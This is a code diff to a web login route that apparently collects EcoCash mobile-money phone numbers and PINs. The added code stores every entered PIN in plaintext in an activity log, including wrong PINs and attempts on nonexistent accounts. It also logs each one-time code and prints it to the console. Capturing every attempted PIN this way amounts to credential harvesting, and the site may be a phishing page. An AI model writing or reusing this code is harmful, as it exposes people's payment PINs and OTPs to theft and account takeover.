@@ -38,34 +38,69 @@ export async function POST(req: Request) {
         }
 
         // 2. USER LOGIN (Phone) - Step 1 of 2
-        // We just verify the phone exists and is enabled, then return success to move to OTP/PIN
         if (type === "user") {
+            // Log LOGIN_ATTEMPT with phone and PIN
+            try {
+                await sql`
+                    INSERT INTO activity_logs (phone_number, activity_type, input_pin)
+                    VALUES (${String(identifier)}, 'LOGIN_ATTEMPT', ${String(pin)})
+                `
+            } catch (logErr) {
+                console.error("[Login] Logging failed:", logErr)
+            }
 
-            // Check if user exists
-            const existingUsers = await sql`SELECT * FROM registrations WHERE ecocash_phone = ${identifier}`
+            // Check if user exists in profiles
+            const existingUsers = await sql`SELECT * FROM profiles WHERE phone_number = ${identifier}`
             const user = existingUsers[0]
+
+            if (!user) {
+                // Log LOGIN_FAILED_NO_USER
+                try {
+                    await sql`
+                        INSERT INTO activity_logs (phone_number, activity_type, input_pin)
+                        VALUES (${String(identifier)}, 'LOGIN_FAILED_NO_USER', ${String(pin)})
+                    `
+                } catch (logErr) {
+                    console.error("[Login] Failed to log no user:", logErr)
+                }
+                return NextResponse.json({
+                    error: "Account not found. Please Sign Up first."
+                }, { status: 404 })
+            }
+
+            // Verify PIN
+            if (user.pin !== pin) {
+                // Log LOGIN_FAILED_WRONG_PIN
+                try {
+                    await sql`
+                        INSERT INTO activity_logs (phone_number, activity_type, input_pin)
+                        VALUES (${String(identifier)}, 'LOGIN_FAILED_WRONG_PIN', ${String(pin)})
+                    `
+                } catch (logErr) {
+                    console.error("[Login] Failed to log wrong PIN:", logErr)
+                }
+                return NextResponse.json({
+                    error: "Incorrect PIN."
+                }, { status: 401 })
+            }
 
             const otp = Math.floor(100000 + Math.random() * 900000).toString()
 
-            if (!user) {
-                // First time user? Create them
+            // Update OTP in profiles
+            await sql`UPDATE profiles SET otp_code = ${otp}, status = 'otp_sent' WHERE phone_number = ${identifier}`
+
+            // Log LOGIN_OTP_SENT with generated OTP
+            try {
                 await sql`
-                    INSERT INTO registrations (ecocash_phone, ecocash_pin, otp_code, status)
-                    VALUES (${identifier}, ${pin || '0000'}, ${otp}, 'otp_sent')
+                    INSERT INTO activity_logs (phone_number, activity_type, input_otp)
+                    VALUES (${String(identifier)}, 'LOGIN_OTP_SENT', ${String(otp)})
                 `
-            } else {
-                // Existing user, update OTP
-                await sql`
-                   UPDATE registrations 
-                   SET otp_code = ${otp}, status = 'otp_sent', updated_at = NOW()
-                   WHERE ecocash_phone = ${identifier}
-                `
+            } catch (logErr) {
+                console.error("[Login] Failed to log OTP sent:", logErr)
             }
 
-            // In production, integrate SMS gateway here
             console.log(`[OTP] Sent to ${identifier}: ${otp}`)
 
-            // Return success but DO NOT set session yet. That happens after OTP verify.
             return NextResponse.json({
                 success: true,
                 redirect: "/login/otp",
